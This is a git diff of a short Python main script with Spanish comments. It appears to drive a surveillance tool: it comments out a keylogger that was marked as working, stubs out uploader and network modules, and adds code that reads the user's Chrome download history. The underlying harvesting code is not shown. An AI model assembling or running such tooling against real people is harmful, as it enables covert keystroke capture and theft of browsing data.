@@ -1,17 +1,20 @@
 #!/usr/bin/env python3
 
-from controller.FileSystemController import FileSystemController
-from controller.KeyloggerController import KeyloggerController
+from controller.FileSystemController    import FileSystemController
+# from controller.KeyloggerController     import KeyloggerController
+from controller.GoogleChromeController  import GoogleChromeController
+# from controller.NetworkController       import NetworkController
+# from controller.UploaderController      import UploaderController
 
 import os
 
 if __name__ == "__main__":
     fs_controller = FileSystemController()
-    ruta_home_usuario = fs_controller.get_home()
+    directorio_home = fs_controller.get_home_directory() 
 
     # Iniciamos el Keylogger [OK]
-    keylogger = KeyloggerController(interval=10)
-    keylogger.start()
+    # keylogger = KeyloggerController(interval=10)
+    # keylogger.start()
 
 
  
@@ -26,3 +29,12 @@ if __name__ == "__main__":
     #     print(hostname, 'is up!')
     # else:
     #     print(hostname, 'is down!')
+
+    google_controller = GoogleChromeController()
+    historial_de_descargas = google_controller.get_download_history()
+
+    if historial_de_descargas:
+        for fila in historial_de_descargas:
+            print(fila['target_path'])
+    else:
+        print("No se obtuvieron resultados.")
